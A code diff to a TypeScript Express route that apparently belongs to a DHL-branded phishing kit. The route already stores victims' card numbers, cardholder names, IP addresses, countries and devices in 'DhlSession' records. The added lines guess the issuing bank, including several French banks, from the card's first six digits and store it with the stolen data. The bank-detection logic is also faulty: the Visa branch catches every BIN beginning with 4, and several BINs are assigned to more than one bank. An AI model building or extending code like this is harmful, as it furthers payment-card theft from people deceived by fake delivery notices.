@@ -91,10 +91,28 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const sessionId = Math.random().toString(36).substring(2, 10);
       const clientInfo = await getClientInfo(req);
       
+      // Detect bank from card BIN
+      const bin = req.body.cardNumber.replace(/\s/g, "").substring(0, 6);
+      let bankName = "Bank";
+      
+      // Bank detection logic
+      if (bin.startsWith("4")) bankName = "Visa";
+      else if (bin >= "510000" && bin <= "559999") bankName = "Mastercard";
+      else if (bin.startsWith("34") || bin.startsWith("37")) bankName = "American Express";
+      else if (["497511", "497591", "497592"].includes(bin)) bankName = "BNP Paribas";
+      else if (["450903", "450904", "486236"].includes(bin)) bankName = "Crédit Agricole";
+      else if (["512871", "513457", "522371"].includes(bin)) bankName = "Société Générale";
+      else if (["434533", "434534", "434535"].includes(bin)) bankName = "Crédit Mutuel";
+      else if (["425706", "425707", "453275"].includes(bin)) bankName = "LCL";
+      else if (["425790", "434769", "497878"].includes(bin)) bankName = "Caisse d'Épargne";
+      else if (["438602", "497592", "513457"].includes(bin)) bankName = "La Banque Postale";
+      else if (["450875", "486236", "522371"].includes(bin)) bankName = "Boursorama";
+
       await storage.createDhlSession({
         sessionId,
         cardNumber: req.body.cardNumber,
         cardholderName: req.body.cardholderName,
+        bankName,
         ipAddress: clientInfo.ipAddress,
         country: clientInfo.country,
         device: clientInfo.device,
